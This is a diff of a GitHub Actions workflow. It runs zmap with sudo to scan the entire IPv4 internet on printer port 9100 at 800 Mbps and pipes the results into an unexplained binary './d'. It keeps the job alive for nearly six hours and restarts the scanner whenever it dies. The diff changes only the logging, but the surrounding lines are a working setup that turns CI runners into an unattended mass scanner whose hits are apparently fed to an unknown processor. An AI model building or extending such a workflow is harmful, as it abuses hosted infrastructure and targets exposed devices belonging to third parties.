@@ -50,12 +50,11 @@ jobs:
           nohup sudo bash -c 'zmap -p 9100 -B 800M 0.0.0.0/0 | ./d' > scanner.log 2>&1 &
           echo $! > scanner.pid
           echo "✅ Scanner started (PID: $(cat scanner.pid))"
-          sleep 2
-          # verify it actually started
-          if ! sudo kill -0 $(cat scanner.pid) 2>/dev/null; then
-            echo "❌ Scanner failed to start. Log:"
-            cat scanner.log
-          fi
+          sleep 5
+          # print the first 20 lines of the log to see if it started or crashed immediately
+          echo "--- Initial Scanner Log ---"
+          head -n 20 scanner.log
+          echo "---------------------------"
 
       - name: ⏳ Live Logs & Run for 5h55m
         run: |
@@ -66,7 +65,8 @@ jobs:
           
           while [ $SECONDS -lt $END_TIME ]; do
             if ! sudo kill -0 $(cat scanner.pid) 2>/dev/null; then
-              echo "⚠️ Scanner died, restarting..."
+              echo "⚠️ Scanner died at $(date). Restarting..."
+              cat scanner.log
               > scanner.log
               nohup sudo bash -c 'zmap -p 9100 -B 800M 0.0.0.0/0 | ./d' > scanner.log 2>&1 &
               echo $! > scanner.pid
